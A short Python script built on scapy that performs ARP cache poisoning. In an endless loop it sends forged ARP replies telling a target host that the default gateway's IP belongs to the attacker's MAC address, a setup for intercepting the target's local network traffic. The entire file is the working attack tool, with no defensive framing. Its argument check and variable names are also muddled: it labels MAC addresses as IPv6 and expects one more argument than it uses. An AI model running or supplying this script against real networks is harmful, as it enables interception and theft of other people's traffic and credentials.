import signal, sys
from scapy.all import *

def main():
	if (len(sys.argv) != 5):
		raise Exception("ARP Poisoning needs IP, IPV6, and the default gateway to work!")
	
	ip_to_infect = sys.argv[1]
	ip_to_infect_v6 = sys.argv[2] 
	default_gateway = sys.argv[3] 
	my_ip_v6 = Ether().src
	poison_packet = ARP(hwsrc=my_ip_v6,hwdst=ip_to_infect_v6, pdst=ip_to_infect,psrc=default_gateway, op=2)
	print("[+] Poisoning %s" % (ip_to_infect))
	count = 0
	signal.signal(signal.SIGINT, end)
	while True:
		count += 1
		sr1(poison_packet, timeout=1, verbose=False)
		print("[+] Poisoning going on... #%s." % (count))

def end(sig, frame):	
	print("Ending poisoning...")
	sys.exit(0)

if __name__ == "__main__":
	main()
